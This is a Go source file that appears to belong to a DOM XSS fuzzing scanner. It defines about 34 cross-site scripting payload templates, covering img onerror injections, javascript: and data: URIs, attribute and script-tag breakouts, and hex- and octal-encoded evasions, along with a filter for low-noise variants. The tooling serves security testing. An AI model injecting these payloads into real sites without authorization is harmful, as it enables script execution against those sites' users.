package core

import "strings"

// PayloadVariant represents a template payload; {{PAYLOAD}} is replaced with the sentinel value.
type PayloadVariant struct {
	Pattern    string
	Aggressive bool
}

// Render instantiates the payload with the provided sentinel token.
func (pv PayloadVariant) Render(token string) string {
	if token == "" {
		return pv.Pattern
	}
	return strings.ReplaceAll(pv.Pattern, "{{PAYLOAD}}", token)
}

// DefaultPayloadVariants returns the curated payload list inspired by domdig.
func DefaultPayloadVariants() []PayloadVariant {
	return []PayloadVariant{
		{Pattern: "';{{PAYLOAD}};'", Aggressive: false},
		{Pattern: "javascript:{{PAYLOAD}}", Aggressive: true},
		{Pattern: "java%0ascript:{{PAYLOAD}}", Aggressive: true},
		{Pattern: "data:text/javascript;,{{PAYLOAD}}", Aggressive: true},
		{Pattern: "<iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: false},
		{Pattern: "\\x3ciMg src=a oNerrOr={{PAYLOAD}}\\x3e", Aggressive: true},
		{Pattern: "\\74iMg src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: "'\"><iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: false},
		{Pattern: "\\x27\\x3E\\x3Cimg src=a oNerrOr={{PAYLOAD}}\\x3E", Aggressive: true},
		{Pattern: "\\47\\76\\74img src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: "\"><iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: false},
		{Pattern: "\\x22\\x3e\\x3cimg src=a oNerrOr={{PAYLOAD}}\\x3e", Aggressive: true},
		{Pattern: "\\42\\76\\74img src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: "'\"><iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: true},
		{Pattern: "\\x27\\x3e\\x3cimg src=a oNerrOr={{PAYLOAD}}\\x3e", Aggressive: true},
		{Pattern: "\\47\\76\\74img src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: "1 --><iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: true},
		{Pattern: "1 --\\x3e\\x3ciMg src=a oNerrOr={{PAYLOAD}}\\x3e", Aggressive: true},
		{Pattern: "1 --\\76\\74iMg src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: "]]><iMg src=a oNerrOr={{PAYLOAD}}>", Aggressive: true},
		{Pattern: "]]\\x3e\\x3ciMg src=a oNerrOr={{PAYLOAD}}\\x3e", Aggressive: true},
		{Pattern: "]]\\76\\74iMg src=a oNerrOr={{PAYLOAD}}\\76", Aggressive: true},
		{Pattern: " oNpasTe={{PAYLOAD}} ", Aggressive: false},
		{Pattern: "\" oNpasTe={{PAYLOAD}} a=\"", Aggressive: false},
		{Pattern: "\\x22 oNpasTe={{PAYLOAD}} a=\\x22", Aggressive: true},
		{Pattern: "\\42 oNpasTe={{PAYLOAD}} a=\\42", Aggressive: true},
		{Pattern: "' oNpasTe={{PAYLOAD}} a='", Aggressive: false},
		{Pattern: "\\x27 oNpasTe={{PAYLOAD}} a=\\x27", Aggressive: true},
		{Pattern: "\\47 oNpasTe={{PAYLOAD}} a=\\47", Aggressive: true},
		{Pattern: "</scrIpt><scrIpt>{{PAYLOAD}}</scrIpt>", Aggressive: true},
		{Pattern: "\\x3c/scrIpt\\x3e\\x3cscript\\x3e{{PAYLOAD}}\\x3c/scrIpt\\x3e", Aggressive: true},
		{Pattern: "\\74/scrIpt\\76\\74script\\76{{PAYLOAD}}\\74/scrIpt\\76", Aggressive: true},
		{Pattern: "${{PAYLOAD}}", Aggressive: false},
		{Pattern: "{{PAYLOAD}}", Aggressive: false},
	}
}

// SelectBaselinePayloads filters the variants to those considered low-noise for baseline fuzzing.
func SelectBaselinePayloads(vars []PayloadVariant) []PayloadVariant {
	filtered := make([]PayloadVariant, 0, len(vars))
	for _, v := range vars {
		if !v.Aggressive {
			filtered = append(filtered, v)
		}
	}
	return filtered
}
